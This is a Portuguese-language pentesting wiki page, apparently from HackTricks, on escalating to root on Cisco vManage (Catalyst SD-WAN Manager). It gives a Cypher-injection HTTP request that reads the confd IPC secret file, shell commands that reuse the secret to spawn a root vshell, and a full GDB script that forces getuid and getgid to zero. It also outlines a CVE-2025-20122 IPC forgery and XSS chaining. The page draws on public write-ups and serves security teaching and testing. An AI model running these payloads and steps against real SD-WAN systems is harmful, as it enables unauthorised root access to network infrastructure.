# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## Caminho 1

(Exemplo de [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Depois de vasculhar um pouco a [documentação](http://66.218.245.39/doc/html/rn03re18.html) relacionada ao `confd` e aos diferentes binários (acessíveis com uma conta no site da Cisco), descobrimos que, para autenticar o IPC socket, ele usa um segredo localizado em `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Lembra da nossa instância Neo4j? Ela está em execução com os privilégios do usuário `vmanage`, permitindo-nos assim recuperar o arquivo usando a vulnerabilidade anterior:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
O programa `confd_cli` não aceita argumentos de linha de comando, mas chama `/usr/bin/confd_cli_user` com argumentos. Portanto, podemos chamar diretamente `/usr/bin/confd_cli_user` com nosso próprio conjunto de argumentos. No entanto, ele não é legível com os nossos privilégios atuais, então precisamos recuperá-lo do rootfs e copiá-lo usando scp, ler a ajuda e usá-lo para obter o shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Caminho 2

(Exemplo de [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

O blog¹ da equipe synacktiv descreveu uma forma elegante de obter um root shell, mas a ressalva é que isso requer obter uma cópia de `/usr/bin/confd_cli_user`, que só é legível por root. Eu encontrei outra forma de escalar para root sem esse transtorno.

Ao desassemblar o binário `/usr/bin/confd_cli`, observei o seguinte:

<details>
<summary>Objdump mostrando a coleta de UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Quando executo “ps aux”, observei o seguinte (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Hipotezei que o programa “confd_cli” passa o ID de usuário e o ID de grupo que coletou do usuário logado para a aplicação “cmdptywrapper”.

Minha primeira tentativa foi executar o “cmdptywrapper” diretamente e passar os argumentos `-g 0 -u 0`, mas falhou. Parece que um descritor de arquivo (-i 1015) foi criado em algum ponto e eu não consigo falsificá-lo.

Como mencionado no blog da synacktiv (último exemplo), o programa `confd_cli` não aceita argumentos de linha de comando, mas posso influenciá-lo com um depurador e, felizmente, o GDB está incluído no sistema.

Criei um script GDB onde forcei as APIs `getuid` e `getgid` a retornarem 0. Como já tenho privilégio “vmanage” via deserialization RCE, tenho permissão para ler diretamente `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Saída do console:

<details>
<summary>Saída do console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug)

Cisco renameou vManage para *Catalyst SD-WAN Manager*, mas o CLI subjacente ainda roda na mesma máquina. Um advisory de 2025 (CVE-2025-20122) descreve validação de entrada insuficiente no CLI que permite que **qualquer usuário local autenticado** obtenha root enviando uma requisição forjada ao serviço CLI do manager. Combine qualquer low-priv foothold (e.g., the Neo4j deserialization from Path1, ou um shell de usuário cron/backup) com esta falha para escalar para root sem copiar `confd_cli_user` ou anexar o GDB:

1. Use seu shell low-priv para localizar o endpoint IPC do CLI (tipicamente o listener `cmdptywrapper` mostrado na porta 4565 em Path2).
2. Crie uma request do CLI que forje os campos UID/GID para 0. O bug de validação não aplica o UID do chamador original, então o wrapper lança um PTY com privilégios de root.
3. Pipe qualquer sequência de comandos (`vshell; id`) através da requisição forjada para obter um shell root.

> The exploit surface is local-only; remote code execution is still required to land the initial shell, but once inside the box exploitation is a single IPC message rather than a debugger-based UID patch.

## Outras vulns recentes do vManage/Catalyst SD-WAN Manager para encadear

* **Authenticated UI XSS (CVE-2024-20475)** – Injete JavaScript em campos específicos da interface; roubar uma sessão de admin fornece um caminho via navegador para `vshell` → shell local → Path3 até root.

## References

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
